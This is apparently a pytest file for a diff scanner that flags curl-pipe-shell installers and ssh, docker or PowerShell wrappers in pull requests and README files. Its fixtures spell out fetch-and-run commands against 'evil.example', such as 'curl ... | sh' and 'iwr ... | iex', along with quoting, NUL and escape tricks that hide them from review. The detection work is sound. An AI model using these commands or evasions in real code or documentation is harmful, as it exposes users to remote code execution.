def test_the_sixty_lines_after_an_opening_line_are_enclosed_and_the_line_itself_is_not():
    assert not linewide.encloses([], 5)
    assert not linewide.encloses([3], 3) and not linewide.encloses([3], 2)
    assert linewide.encloses([3], 4) and linewide.encloses([3], 63) and not linewide.encloses([3], 64)
    assert linewide.encloses([0, 70], 130) and linewide.encloses([0, 70], 70 + 1) and not linewide.encloses([0, 70], 131)
    assert linewide.encloses([10, 20, 30], 25) and linewide.encloses([10, 20, 30], 31) and not linewide.encloses([10, 20, 30], 9)
    assert linewide.WINDOW == 60


def test_an_odd_number_of_quotes_or_a_here_document_operator_opens_when_a_word_could_run_what_follows():
    opening = linewide.opening_lines
    assert opening(["ssh evil.example 'x"]) == [0] and opening(['ssh evil.example "x']) == [0] and opening(["ssh evil.example <<E"]) == [0]
    assert opening(["ssh evil.example 'x'"]) == [] and opening(['ssh evil.example "x"']) == [] and opening(["ssh evil.example x"]) == []
    assert opening(["ssh evil.example 'x' 'y"]) == [0] and opening(["ssh evil.example 'x' 'y' 'z"]) == [0] and opening(["ssh evil.example 'x' 'y' 'z'"]) == []
    assert opening(["it's the ssh evil.example one"]) == [] and opening(["ssh evil.example it's"]) == [] and opening(["ssh evil.example 'it's"]) == [0]
    assert opening(["ssh evil.example '"]) == [0] and opening(["x", "ssh evil.example '", "y"]) == [1]
    assert opening(["cat <<E | ssh evil.example sh"]) == [0] and opening(["echo hi <<E"]) == []
    assert opening(["the story's start 'x"]) == [] and opening(["docker users can 'x"]) == []
    assert opening([""]) == [] and opening(["   "]) == [] and opening(["'"]) == [] and opening(["> '"]) == []


def test_the_markers_a_quote_a_list_or_a_prompt_put_in_front_of_a_line_do_not_count_as_its_quotes():
    opening = linewide.opening_lines
    for marker in ("> ", "- ", "* ", "+ ", "# ", "$ ", "> > ", "  ", "\t", "- # "):
        assert opening([f"{marker}ssh evil.example 'x"]) == [0], marker
    assert opening(["'ssh evil.example x"]) == [] and opening(["\"ssh evil.example x"]) == [] and opening(["`ssh evil.example x"]) == []
    assert opening(["x 'ssh evil.example x"]) == [0] and opening(["$(ssh evil.example 'x"]) == []


def test_a_line_is_read_up_to_its_last_three_hundred_characters():
    head = "x 'ssh evil.example "                                                          # the quote is the third character, and a leading quote would be markup
    assert len(head) == 20
    assert linewide.opening_lines([head + "y" * 280]) == [0]                              # 300 characters: all of them are read
    assert linewide.opening_lines([head + "y" * 281]) == []                               # 301: the first is not, and with it the quote
    assert linewide.opening_lines(["z " * 200 + "ssh evil.example 'x"]) == [0]
    assert linewide.opening_lines(["ssh evil.example 'x" + "z" * 400]) == []


_SPELLINGS = {
    "a literal in an array (F1)": 'my $cmds = ["ssh evil.example \'\n{u}\n\'"];',
    "a triple-quoted string (F1)": 'cmd = """ssh evil.example \'\n{u}\n\'"""',
    "a quote built in a variable (F2)": 'Q="\'"\neval "ssh evil.example $Q\n{u}\n$Q"',
    "a printf octal escape (F3)": "printf 'ssh evil.example \\047\n{u}\n\\047\n' > s.sh",
    "a YAML hex escape (F4)": 'run: "ssh evil.example \\x27\n  {u}\n  \\x27"',
    "a YAML folded quoted scalar (F5)": 'run: \'ssh evil.example\n  "{u}"\n  \'',
    "a string joined by a leading operator (F6)": '$cmd = "ssh evil.example \'"\n    . "{u}"\n    . "\'";',
    "a path word in front of the wrapper (B2)": "cd /srv/app && ssh prod '\n{u}\n'",
    "an empty link between the wrapper and the quote (B3)": "ssh evil.example [](u)'\n{u}\n'",
    "a code span glued to a word (B4)": "ssh evil.example x`'`\n{u}\n'",
    "a numbered prompt in front of a here-document (B5)": "1. # cat <<E | ssh h.example sh\n{u}\nE",
}


def _installer_severities(body: str, filename: str | None) -> list[str]:
    event = {**BENIGN_EVENT, "body": body}
    if filename:
        patch = "".join(f"+{line}\n" for line in body.split("\n"))
        event = {**BENIGN_EVENT, "body": "", "files": [{"filename": filename, "status": "added", "additions": 1, "deletions": 0, "patch": patch}]}
    return sorted({h.severity for h in scan_change(event) if h.rule == "curl-pipe-shell"})


@pytest.mark.parametrize("filename", [None, "README.md", "docs/guide.rst"])
@pytest.mark.parametrize("name", list(_SPELLINGS))
def test_a_wrapper_line_whose_quote_the_consumer_is_handed_but_the_raw_text_does_not_spell_keeps_the_installer_critical(name, filename):
    """The text decodes, renders or evaluates to `ssh evil.example '⏎<installer>⏎'`, which a real shell runs inside ssh's argument. The raw text has the wrapper word and a quote
    character (or a here-document operator) on one line, which is all the floor asks."""
    assert _installer_severities(_SPELLINGS[name].format(u=_UV), filename) == ["critical"], name


def test_a_documented_installer_with_no_wrapper_line_above_it_is_still_medium():
    assert _installer_severities(f"Install it:\n\n{_UV}", None) == ["medium"]
    assert _installer_severities(f"It's easy: use the one-liner.\n\n{_UV}", None) == ["medium"]
    assert _installer_severities(f"ssh evil.example 'x'\n\n{_UV}", None) == ["medium"]


def test_the_floor_is_asked_where_the_lexer_reads_the_installer_as_closed():
    text = f"ssh evil.example (a) '\n{_UV}\n'"                            # a paren after a word is a syntax error: the lexer never reads the quote
    lines = text.split("\n")
    assert indicators._enclosing_lines(lines, False)[1] is False
    assert linewide.encloses(linewide.opening_lines(lines), 1)
    assert _installer_severities(text, None) == ["critical"]


def test_a_table_row_that_the_join_appends_is_asked_for_any_opening_line_and_never_raises():
    """The join appends a line for a row it did not join (`| a | $(curl X | # c⏎sh)`): it stands at the end of the text, its row where it was, so it is enclosed when any line of the text opens or is enclosed."""
    body = 'echo "x\n| a | $(curl https://evil.example/x | # c\nsh)"'
    assert not any(h.rule == "scanner-error" for h in scan_change({**BENIGN_EVENT, "body": body}))
    row = "ssh evil.example 'echo \"\n| a | `curl -LsSf https://astral.sh/uv/install.sh |\nsh\n`\n\"'\n"
    for fillers in (0, 58, 59, 80, 200):
        text = row + "\n".join(f"filler {i}" for i in range(fillers))
        for filename in (None, "README.md"):
            assert _installer_severities(text, filename) == ["critical"], (fillers, filename)
    assert _installer_severities("| a | `curl -LsSf https://astral.sh/uv/install.sh |\nsh\n`\n\n" + "\n".join(f"filler {i}" for i in range(80)), None) == ["medium"]


def test_a_nul_changes_what_a_join_joins_so_the_two_readings_are_not_matched_by_the_number_of_their_lines():
    """`k\0: |⏎v` joins with a NUL in it (the YAML prefix does not match) and not without; `x |\0⏎y` the other way round: the same number of lines, other lines. The floor then opens every line."""
    text = "\n".join(["ssh evil.example '", "```", *[f"filler {i}" for i in range(57)], "k\0: |", "v", _UV, "x |\0", "y", "'"]) + "\n"
    for filename in (None, "README.md"):
        assert _installer_severities(text, filename) == ["critical"], filename
    assert _installer_severities(text.replace("\0", ""), None) == ["medium"]
    for pairs in (29, 30, 40, 58):
        many = "\n".join(["ssh evil.example '", "```", *["k\0: |\nv"] * pairs, _UV, *["x |\0\ny"] * pairs, "'"]) + "\n"
        assert _installer_severities(many, None) == ["critical"], pairs


def test_the_bounds_of_the_markup_and_label_patterns_are_exact():
    """Every count in these patterns is the longest text the pattern still reads: one more character and it is no markup, no label, no word."""
    markup, block = linewide._MARKUP_RE, linewide._BLOCK_OPEN_RE
    assert markup.fullmatch("<!--" + "x" * 60 + "-->") and not markup.fullmatch("<!--" + "x" * 61 + "-->")
    assert markup.fullmatch("<a" + "b" * 10 + ">") and not markup.fullmatch("<a" + "b" * 11 + ">")
    assert markup.fullmatch("</a" + "b" * 10 + ">") and not markup.fullmatch("</a" + "b" * 11 + ">")
    assert linewide._CLOSING_TAG_RE.fullmatch("</a" + "b" * 10 + ">") and not linewide._CLOSING_TAG_RE.fullmatch("</a" + "b" * 11 + ">")
    for pattern, tag in ((markup, "<a"), (block, "<div")):
        for quote in ('"', "'"):
            assert pattern.fullmatch(f"{tag} {quote}" + "x" * 400 + f"{quote}>"), (tag, quote)
            assert not pattern.fullmatch(f"{tag} {quote}" + "x" * 401 + f"{quote}>"), (tag, quote)
        assert pattern.fullmatch(f"{tag} " + "x" * 600 + ">") and not pattern.fullmatch(f"{tag} " + "x" * 601 + ">"), tag
    label = linewide._LABEL_WORD_RE
    assert label.fullmatch("a" + "b" * 29 + ":x") and not label.fullmatch("a" + "b" * 30 + ":x")
    assert label.fullmatch("a:b" + "c" * 100) and not label.fullmatch("a:b" + "c" * 101)
    assert label.fullmatch("a:./" + "c" * 100) and not label.fullmatch("a:./" + "c" * 101)
    assert label.fullmatch("a:" + "!" * 6 + "b") and not label.fullmatch("a:" + "!" * 7 + "b")
    lead = linewide._LEAD_PUNCT_WORD_RE
    assert lead.fullmatch("1)a" + "b" * 100) and not lead.fullmatch("1)a" + "b" * 101)


@pytest.mark.parametrize(("text", "expected"), [
    ("pwsh -f x ", True), ("pwsh -F x ", True), ("pwsh -e x ", True), ("pwsh -enc x ", True), ("pwsh -file x ", True), ("pwsh -EncodedCommand x ", True), ("powershell -File x ", True),
    ("pwsh -c x ", False), ("pwsh x.txt ", False), ("powershell -c x ", False), ('pwsh "-f" x ', True), ("pwsh '-e' x ", True),
])
def test_a_powershell_script_file_or_an_encoded_command_runs_what_follows_and_a_command_does_not(text, expected):
    assert linewide.wrapped(text) is expected, text


@pytest.mark.parametrize(("before", "expected"), [
    ("evil-", True), ("evil", True), ("x ", False), ("", False), ("a_", True), ("_", False), ("_a_", True), ("x~~", False), ("x`", False), ("x'", False), ("x\u201c", False), ("x\u00e9", True), ("x\u2192", False),
    ("x.", True), ("x)", True), ("x(", False), ("x[", False), ("x{", False), ("x>", False), ("x*", False), ("x\t", False),
])
def test_a_name_glued_to_the_command_is_a_program_that_runs_it(before, expected):
    assert linewide.wrapped(before) is expected, before


@pytest.mark.parametrize("name", ["bin/}x", "bin/]x", "bin/\U0001f600", "bin/\u00a9", "bin/\u2026", "bin/\u2014", "bin/\u2192", "bin/\u00a0x", "bin/\u2003x", "bin/\u3000x", "./\u00a0x"])
@pytest.mark.parametrize("filename", [None, "README.md"])
def test_a_program_by_a_path_in_front_of_the_command_keeps_the_installer_critical_whatever_its_name_holds(name, filename):
    """The lead check of the softening reads a word with a slash as a program only when a name follows it; the earlier rule read the first word of a line with a slash as a program. A file
    named `bin/}x` runs (the shell's blanks are a space, a tab and a newline) and its output goes to `sh`, so the floor asks the earlier rule of the text in front of the command."""
    assert _installer_severities(f"{name} {_UV}", filename) == ["critical"], name


def test_a_nul_hides_an_apostrophe_from_the_floor_no_more_than_it_did_before_the_lexer():
    """The earlier rule read a NUL as an ordinary character, so `x\0'y` held a quote that is not between two letters; a shell deletes the NUL and reads `x'y`. The floor reads both."""
    text = f"ssh evil.example x\0'y\n```\n{_UV}\n```\n'\n"
    assert linewide.opening_lines(text.split("\n")) == [0]
    assert linewide.opening_lines(text.replace("\0", "").split("\n")) == []
    for filename in (None, "README.md"):
        assert _installer_severities(text, filename) == ["critical"], filename
    assert _installer_severities(text.replace("\0", ""), None) == ["medium"]
    assert _installer_severities(f"ssh evil.example\0 x\n\n{_UV}", None) == ["medium"]


@pytest.mark.parametrize("text", ["print('<p>hi</p>')", "Wrap it with `bold('<b>x</b>')` in your template.", "The <b>tool</b>'s installer is below.", "x = '</div>'", "cat </bin/sh"])
def test_the_slash_of_a_closing_tag_or_of_a_redirect_target_is_no_program_that_starts_a_command(text):
    assert _installer_severities(f"{text}\n\n{_UV}", None) == ["medium"], text


@pytest.mark.parametrize(("lines", "expected"), [
    (["uv ! 'x"], []), (["uv ? 'x"], []), (["python.11 evil.py 'x"], [0]), (["python3.* evil.py 'x"], []),
    (["x > a > a > a > ssh -x 'y"], [0]), (["x > a > a > a > ssh<f -x 'y"], [0]), (["ssh -x > a > a > a > sh x 'y"], []),
])
def test_a_lone_punctuation_word_a_version_and_four_redirects_in_a_line_are_read_as_the_grammar_reads_them(lines, expected):
    assert linewide.opening_lines(lines) == expected, lines


@pytest.mark.parametrize(("text", "expected"), [
    ("curl >& x < sh ? x.ps1 2> python3.11 ", True), ("x > a > a > a > ssh ", True), ("x > a > a > a > docker-compose -x ", True), ("x > a > a > a > ./evil ", True),
    ("x > a > a > a > a/b ", True), ("x > a > a > a > nodejs ", True), ("x > a > a > a > docker run ", True), ("x > a > a > a > a > ssh ", True), ("x > a > a > ssh ", True), ("> ssh ", True),
    ("x > a > a > a > python3 x.py ", False), ("x > a > a > a > sudo ", False), ("x > a > a > a > ssh x ", False), ("x > a > a > a > docker x ", False), ("x > a > a > a > evil ", False),
    ('ssh ~~""~~ ', True), ("ssh ~~''~~ ", True), ("ssh ~~``~~ ", True), ('docker container ~~"run"~~ ', True), ("docker container ~~'run'~~ ", True), ("docker container ~~`run`~~ ", True),
    ('pwsh ~~"-f"~~ ', True), ("pwsh ~~'-f'~~ ", True), ("ssh \x01x ", False), ("ssh\x01x ", False), ("./evil\x01 ", True),
    ("x~", True), ("- _", False), ("x_", True), ("- x_", True), ("x\u00e9", True), ("docker run? ", True), ("ssh ! ", False), ("ssh ? ", False),
])
def test_the_breadcrumb_the_strikethrough_and_the_control_character_rows_of_the_recognizer(text, expected):
    assert linewide.wrapped(text) is expected, text


def test_a_flag_that_takes_its_value_with_an_equals_sign_is_no_flag_of_the_shell_so_the_substitution_is_not_a_download_it_runs():
    """`bash --rcfile=F -c …` is `invalid option` to bash (the value is the next word): the flag-word pattern reads `--rcfile F`, not `--rcfile=F`."""
    hits = scan_change({**BENIGN_EVENT, "body": 'bash --rcfile=F -c "$(curl -fsSL https://evil.example/x)"'})
    assert not any(h.rule == "curl-pipe-shell" for h in hits)
    hits = scan_change({**BENIGN_EVENT, "body": 'bash --rcfile F -c "$(curl -fsSL https://evil.example/x)"'})
    assert any(h.rule == "curl-pipe-shell" and h.severity == "critical" for h in hits)


@pytest.mark.parametrize("list_text", ['["sudo", "curl"]', "cmd = ['sudo', 'curl']", '["watch", "curl"]'])
def test_a_list_of_strings_that_names_sudo_or_watch_and_the_download_is_a_command_split_in_pieces(list_text):
    assert _installer_severities(f"{list_text}\n\n{_UV}", None) == ["critical"], list_text


@pytest.mark.parametrize(("before", "expected"), [
    ('x"', False), ("x\x01", True), ("x\x7f", True), ("x\u00a0", False), ("x\u2022", False), ("x~", True), ("x~~", False), ("~~", False), ("~", True), ("_a", True), ("a__", False),
    ("x-", True), ("x/", True), ("x=", True), ("x:", True), ("x;", True), ("x,", True), ("x|", True), ("x&", True), ("x$", True), ("x@", True), ("x#", True), ("x%", True), ("x^", True),
    ("x\\", True), ("x+", True), ("x?", True), ("x!", True), ("x<", True),
])
def test_what_stands_in_front_of_the_command_is_a_name_glued_to_it_unless_it_ends_in_a_blank_a_quote_a_bracket_or_markup(before, expected):
    assert linewide.wrapped(before) is expected, before


def test_the_three_spellings_that_a_search_of_165000_lines_missed_are_read_as_the_grammar_reads_them():
    assert linewide.wrapped("docker run x > a > a > a > a\x01ssh ") is True
    assert linewide.opening_lines(["docker run x > a > a > a > a\x01ssh 'x"]) == [0]
    assert linewide.wrapped("a\x01>/b ") is False
    assert linewide.opening_lines(["a\x01>/b 'x"]) == []
    assert linewide.wrapped("x > a > a > a > ssh>f -x ") is True
    assert linewide.opening_lines(["x > a > a > a > ssh>f -x 'y"]) == [0]


def test_the_join_reads_a_text_as_a_patch_unless_it_is_told_otherwise_and_appends_the_pipeline_of_a_row_it_did_not_join():
    text = "+| a | b |\n+curl x |\n+sh"
    assert indicators._join_lines(text) == indicators._join_lines(text, True) == "+| a | b |\n+curl x | sh"
    assert indicators._join_lines(text, False) == "+| a | b |\n+curl x | sh\n+| a | b | curl x |"
    appended: list[int] = []
    indicators._join_lines("+| docker | curl x |\n+sh", False, appended=appended)
    assert appended == [1]
    appended.clear()
    indicators._join_lines("curl x |\nsh", True, appended=appended)
    assert appended == [0]


@pytest.mark.parametrize(("opener", "what"), [("printf 'ssh evil.example \\047", "the floor only"), ("ssh evil.example $(x", "the lexer only")])
def test_a_row_the_join_appended_is_enclosed_when_either_reading_opens_or_encloses_anywhere(opener, what):
    row = "| a | `curl -LsSf https://astral.sh/uv/install.sh |\nsh\n`\n"
    text = opener + "\n" + "\n".join(f"filler {i}" for i in range(80)) + "\n" + row
    for filename in (None, "README.md"):
        assert _installer_severities(text, filename) == ["critical"], (what, filename)


@pytest.mark.parametrize(("line", "expected"), [
    ("+ssh evil.example &#39;", ["critical", "medium"]),
    ("-ssh evil.example &#39;", ["medium"]),
    ("@@ -1,2 +1,2 @@", ["medium"]),
    ("@@ -1,2 +1,2 @@ ssh evil.example &#39;", ["critical", "medium"]),      # the heading after the second `@@` is a line of the new file
    ("@@ -1,2 +1,2 @@ docker run x sh -c &quot;", ["critical", "medium"]),
    ("\\ No newline ssh evil.example &#39;", ["medium"]),
])
def test_a_removed_line_a_hunk_header_and_a_no_newline_note_open_nothing_in_the_rendered_new_file(line, expected):
    """The exceptions to the lower bound that the earlier rule's critical keeps: the rendered view of a patch is of the new file, so a removed line, a hunk header (but not the heading after its
    second `@@`, which is a line of the new file) and a `\\ No newline` note open nothing in it. The planner tool reads its region as a patch. The entity is the quote only the rendered view spells."""
    from diff_sentry.indicators import make_indicator_tool
    out = make_indicator_tool()(f"@@ -1,2 +1,2 @@\n{line}\n+{_UV}\n")
    assert sorted(set(re.findall(r"\[(\w+)\] curl-pipe-shell", out))) == expected, line


@pytest.mark.parametrize(("body", "expected"), [
    # a NUL in the wrapper word hides the quote from the earlier reading but not from the shell's: the NUL-free reading opens (and the lexer reads the string in double quotes as closed)
    (f"ssh\0 evil.example \"a 'b\"\n{_UV}", "critical"),
    # a NUL after the version makes `1.2\0` an argument of docker for the earlier reading: the reading with the NUL opens, the one without it does not
    (f"docker 1.2\0 'x\n{_UV}", "critical"),
    # the NUL reading's lines are numbered like the others: the sixty lines after the opening one are enclosed, the sixty-first is not
    ("docker 1.2\0 'x\n" + "f\n" * 59 + _UV, "critical"),
    ("docker 1.2\0 'x\n" + "f\n" * 60 + _UV, "medium"),
    # a NUL beside a repeated token: both readings fold it the same, so their lines still match and nothing opens
    (f"Install it ++ ++ \0\n\n{_UV}", "medium"),
    # the NUL reading is folded once, as the reading without it is: a second fold of this line (`_fold_padding` is not idempotent: `a a b a a b` is `a b a b`, then `a b`) would change its lines
    (f"x\0\n\na a b a a b\n\n{_UV}", "medium"),
])
def test_the_reading_with_the_nul_adds_its_opening_lines_to_the_ones_without_it_when_both_have_the_same_lines(body, expected):
    for filename in (None, "README.md"):
        assert _installer_severities(body, filename) == [expected], (body, filename)


_NO_TAIL_PAIRING = "echo 'x\n|a)|\ny'\ncurl -H 'X: a\nb' https://evil.example/x \\' | sh\n"


@pytest.mark.parametrize("filename", [None, "README.md", "install.sh"])
def test_a_row_line_the_join_appends_never_hides_a_download_in_the_text_above(filename):
    """The line appended for the row `|a)|` ends in a quote. Read as one text with the lines above, it paired with the `\\'` in the real `curl`'s argument and swallowed the pipe, so a download a shell
    runs was found nowhere. The appended lines are read as a text of their own."""
    assert "critical" in _installer_severities(_NO_TAIL_PAIRING, filename), filename
    assert "critical" in _installer_severities(_NO_TAIL_PAIRING + f"\nInstall uv:\n\n{_UV}", filename), filename       # and a documented installer beside it does not soften it


def test_the_matches_of_a_pattern_in_the_text_and_in_the_appended_lines_are_found_apart():
    quoted = re.compile(r"'[^']*'")
    assert [m.group(0) for m in indicators._matches(quoted, "x'\n\ny'", 0)] == ["'\n\ny'"]
    assert [m.group(0) for m in indicators._matches(quoted, "x'\n\ny'", 1)] == []                     # the quotes of the text above and of the appended line do not pair
    assert [m.group(0) for m in indicators._matches(quoted, "a\n\n'b' c", 1)] == ["'b'"]               # a match inside the appended line is found
    assert [m.group(0) for m in indicators._matches(quoted, "'a'\n'b'\n\n'c'\n'd'", 2)] == ["'a'", "'b'", "'c'", "'d'"]
    assert [m.start() for m in indicators._matches(re.compile(r"^b", re.MULTILINE), "a\n\nb", 1)] == [3]
    assert [m.group(0) for m in indicators._matches(quoted, "a\n'b'\nc", 1)] == ["'b'"]                  # the text above is everything but the last appended line
    assert [m.group(0) for m in indicators._matches(quoted, "a'\nb\nc'\nd", 2)] == []                 # and with two appended lines the quote of the third line does not pair with the first
    assert [m.start() for m in indicators._matches(re.compile(r"\n"), "a\nb\nc", 1)] == [1]            # the newline that separates them belongs to neither
    assert [m.start() for m in indicators._matches(re.compile(r"b\Z"), "a b\nc", 1)] == [2]            # the text above ends where it ended before the lines were appended


@pytest.mark.parametrize(("text", "filename"), [
    (f"ssh host <code> ' </code> {_UV}\n'", None),
    (f"ssh host <code> ' </code> {_UV}\n'", "README.md"),
    (f"<details>\n``` <code>{_UV}</code>", None),
    (f"<details>\n``` <code>{_UV}</code>", "README.md"),
])
def test_a_backtick_that_the_rendered_view_erases_still_keeps_the_installer_critical(text, filename):
    """`<code> ' </code>` renders to a bare quote and a fence marker inside an HTML block is blanked, and both take the backtick away that makes a command in front of the installer not its own: the
    view without those two readings is read as well, and the stricter hit stands."""
    assert "critical" in _installer_severities(text, filename), (text, filename)


def test_the_rendered_views_of_a_text_are_those_that_differ_from_it():
    assert indicators._rendered_views("curl x | sh") == []
    assert indicators._rendered_views("a <b>b</b>") == ["a b"]
    assert indicators._rendered_views("a ` ' ` b") == ["a ' b"]                       # the view without the two readings is the text itself, which is read as it is
    assert indicators._rendered_views("<pre>\n```\nx\n```") == ["\n\n   \nx\n   ", "\n\n```\nx\n```"]       # a fence marker inside an HTML block is blanked in the first view only
    two = indicators._rendered_views("ssh host <code> ' </code> x")
    assert two == ["ssh host ' x", "ssh host ` ' ` x"]
    assert indicators._rendered("ssh host <code> ' </code> x", quotes=False) == "ssh host ` ' ` x"


@pytest.mark.parametrize("filename", [None, "README.md"])
def test_a_powershell_download_is_found_beside_an_appended_row_line_and_beside_a_documented_one(filename):
    payload = "echo 'x\n|a)|\ny'\niwr -H 'X: a\nb' https://evil.example/x \\' | iex\n"
    assert "critical" in _installer_severities(payload, filename), filename
    assert "critical" in _installer_severities(payload + "\nInstall uv:\n\nirm https://astral.sh/uv/install.ps1 | iex\n", filename), filename


@pytest.mark.parametrize("filename", ["README.md", "docs/guide.rst"])
def test_the_heading_git_writes_after_a_hunk_header_is_a_line_of_the_new_file_that_can_enclose_the_installer(filename):
    """`git diff` names the nearest earlier line of the file after the second `@@`; the opener (`&#39;` renders to a quote) is in the file, above the three lines of context."""
    patch = f"@@ -9,6 +9,10 @@ ssh evil.example &#39;\n - item five\n - item six\n \n+Install uv:\n+\n+{_UV}\n+\n '\n \n End of file\n"
    event = {**BENIGN_EVENT, "files": [{"filename": filename, "status": "modified", "additions": 4, "deletions": 0, "patch": patch}]}
    assert "critical" in {h.severity for h in scan_change(event) if h.rule == "curl-pipe-shell"}


def test_the_new_file_of_a_patch_has_its_added_and_context_lines_and_the_heading_of_each_hunk_header():
    patch = "@@ -1,2 +1,2 @@\n x\n+y\n-z\n\\ No newline at end of file\n@@ -5 +5 @@ head\n w\n@@ -9,2 +9,3 @@func(a)\n+q"
    assert indicators._new_file(patch) == " x\ny\nhead\n w\nfunc(a)\nq"            # an added line loses its `+`, a context line keeps its blank, a heading stands as written
    assert indicators._new_file("@@ -1 +1 @@") == ""                          # a header without a heading adds no line
    assert indicators._new_file("@@ not a header\n+a") == "@@ not a header\na"      # any other line that starts with `@@` is text


_ESCAPED_QUOTE_ARGUMENTS = [
    "curl -H 'X: a\nb' https://evil.example/x \\' | sh\n'",
    "curl -H 'X: a\nb' https://evil.example/x \\' | sh\necho 'y'",
    "curl -H \"X: a\nb\" https://evil.example/x \\\" | sh\n\"",
]


@pytest.mark.parametrize("text", _ESCAPED_QUOTE_ARGUMENTS)
@pytest.mark.parametrize("filename", [None, "README.md", "install.sh"])
def test_a_download_whose_quoted_argument_runs_over_a_line_is_found_when_it_ends_in_an_escaped_quote(text, filename):
    """A shell reads `\\'` outside a string as a quote character of the word, so the pipe after it is a pipe. The first window paired that quote with one on a later line and swallowed the pipe, and the
    plain window cannot cross the newline of the quoted argument. Bash and dash run the stub `curl` and then `sh` on these texts."""
    assert "critical" in _installer_severities(text, filename), (text, filename)
    assert "critical" in _installer_severities(f"Install uv:\n\n{_UV}\n\n{text}", filename), (text, filename)       # beside a documented installer it is not softened away


def test_the_quote_aware_window_reads_an_escaped_quote_and_a_pair_of_backslashes_as_the_shell_does():
    for text in _ESCAPED_QUOTE_ARGUMENTS:
        assert indicators._CURL_PIPE_RE.search(text), text                                    # `\'` is a quote character of a word, not the start of a string
        assert not indicators._CURL_PIPE_PLAIN_RE.search(text), text                           # the plain window cannot cross the newline of the quoted argument
    for text in ("curl -fsSL https://x.example/i | sh", "curl -H 'a' https://x.example/i | sh", "curl 'it'\\''s' https://x.example/i | sh", "curl \\\\ https://x.example/i | sh",
                 "curl $URL | sh", "curl a$b | sh", "curl 'x'$y | sh", "curl $'abc | sh"):        # a dollar that starts no $'...' string is a plain character
        assert indicators._CURL_PIPE_RE.search(text), text
    assert indicators._CURL_PIPE_PLAIN_RE.search("curl https://x.example/i \\| sh") and not indicators._CURL_PIPE_RE.search("curl https://x.example/i \\| sh")      # a table cell's escaped pipe: the plain window
    assert not indicators._CURL_PIPE_RE.search("curl -H 'a | sh'")                              # a pipe inside a string is not a pipe
    # an even run of backslashes is escaped backslashes and then a quote that opens a string, which the newline-crossing quoted argument closes
    assert indicators._CURL_PIPE_RE.search("curl https://evil.example/x \\' \\\\' x\n' | sh")
    assert not indicators._CURL_PIPE_RE.search("curl 'it\n' \\\\' |bash\n# it's")



_QUOTED_PIPE_BEFORE_THE_URL = [
    'curl "<url> | evil " https://evil.example/x.sh | sh',
    "curl '<url> | cat ' https://evil.example/x.sh | sh",
    'curl "url | evil " https://evil.example/x.sh | sh',
    'curl -sS "[x] | evil " https://evil.example/x.sh | sudo bash',
]


@pytest.mark.parametrize("text", _QUOTED_PIPE_BEFORE_THE_URL)
@pytest.mark.parametrize("filename", [None, "README.md", "install.sh"])
def test_a_quoted_pipe_in_front_of_the_real_url_keeps_the_download_critical(text, filename):
    """The quoted `|` is an argument (a placeholder and a pipe in one string); the real URL is the next argument and the shell fetches it. Two windows find the same span; the one the softening judges is the plain
    window, which reads the quoted pipe as a stage that is no copy filter. Judging the capture of the escaped window instead read the placeholder only and softened the download."""
    assert "critical" in _installer_severities(text, filename), (text, filename)


_DOLLAR_QUOTE_ARGUMENTS = [
    "curl $$'\\' 'a\nb' https://evil.example/x | sh",
    "curl \\$'\\' 'a\nb' https://evil.example/x | sh",
    "curl -fsSL \\$'\\' -d 'a\nb' https://evil.example/x | sudo bash",
    "curl $'\\' 'a\nb' https://evil.example/x | sh",
    "curl 'a\nb' x \\$'a\\' | sh\n'",
    "curl 'a\nb' x $'a\\' | sh\n'",
]


@pytest.mark.parametrize("text", _DOLLAR_QUOTE_ARGUMENTS)
@pytest.mark.parametrize("filename", [None, "README.md", "install.sh"])
def test_a_dollar_that_starts_no_ansi_c_string_leaves_the_quote_after_it_a_plain_single_quoted_string(text, filename):
    """After `\\$` and after `$$` (the PID) bash reads `'...'` as a single-quoted string, and dash reads every `$'` that way; the window that takes `$'...'` for an ANSI-C string (where `\\'` is an
    escaped quote) swallows the next quote and the multi-line argument stays open. The window with `$` as a plain character finds them."""
    assert "critical" in _installer_severities(text, filename), (text, filename)
    assert "critical" in _installer_severities(f"Install uv:\n\n{_UV}\n\n{text}", filename), (text, filename)
    assert indicators._CURL_PIPE_DOLLAR_RE.search(text), text


_ESCAPED_PIPE_ARGUMENTS = [
    "curl -H 'a\nb' https://evil.example/x.sh \\'\\|\\' | sh\n",
    "curl -H 'a\nb' \\'\\|\\' https://evil.example/x.sh | sh\n",
    "curl -H 'a\nb' https://evil.example/x \\| 2 | sh",
    "curl -H 'a\nb' https://evil.example/x \\\"\\|\\\" | sh",
    "curl -H 'a\nb' https://evil.example/x \\|\\| | sh",
    "curl -H 'a\nb' \\$'x\\' https://evil.example/x.sh | sh\nz'",
    "curl -H $'a\nb\\' https://evil.example/x.sh | sh\nz'",
]


@pytest.mark.parametrize("text", _ESCAPED_PIPE_ARGUMENTS)
@pytest.mark.parametrize("filename", [None, "README.md", "install.sh"])
def test_an_escaped_pipe_or_dollar_among_the_arguments_of_a_multi_line_download_does_not_hide_the_pipe(text, filename):
    """A shell reads `\\|` as an ordinary character of a word, so the pipe after it is the pipe. Bash and dash run the stub `curl` and then `sh` on these texts (the `$'` one under dash only). A single-line Markdown
    table cell that spells its pipe `\\|` is found by the window that ignores quotes."""
    assert "critical" in _installer_severities(text, filename), (text, filename)
    assert "critical" in _installer_severities(f"Install uv:\n\n{_UV}\n\n{text}", filename), (text, filename)


def test_an_escaped_pipe_is_a_cell_pipe_only_in_a_table_row_and_after_an_even_run_of_backslashes():
    assert indicators._unescape_pipes("| a \\| b |") == "| a | b |"
    assert indicators._unescape_pipes("| a \\|") == "| a |"                                 # a row that ends in an escaped pipe
    assert indicators._unescape_pipes("+| a \\| b |") == "+| a | b |"                    # a patch's added row
    assert indicators._unescape_pipes("> | a \\| b |") == "> | a | b |"                  # in a quote
    assert indicators._unescape_pipes("a \\| b") == "a \\| b"                            # not a row: the shell's
    assert indicators._unescape_pipes("curl \\| URL | sh") == "curl \\| URL | sh"
    assert indicators._unescape_pipes("| a \\\\| b |") == "| a \\\\| b |"             # an escaped backslash and then a real pipe
    assert indicators._unescape_pipes("| a \\\\\\| b |") == "| a \\\\| b |"          # three backslashes: an escaped backslash, then a cell's `\\|`
    assert indicators._unescape_pipes("| a \\\\\\\\| b |") == "| a \\\\\\\\| b |"
    assert indicators._unescape_pipes("| \\|\\| |") == "| || |"
    assert indicators._unescape_pipes("x\n| a \\| b |\ny \\| z") == "x\n| a | b |\ny \\| z"       # only the row lines


_EVEN_BACKSLASHES_BEFORE_THE_PIPE = [
    "curl \"\n\"https://evil.example/x\\\\|sh",
    "curl -H 'a\nb' https://evil.example/x \\\\| sh",
    "curl -H 'a\nb' https://evil.example/x \\\\\\\\| sudo bash",
]


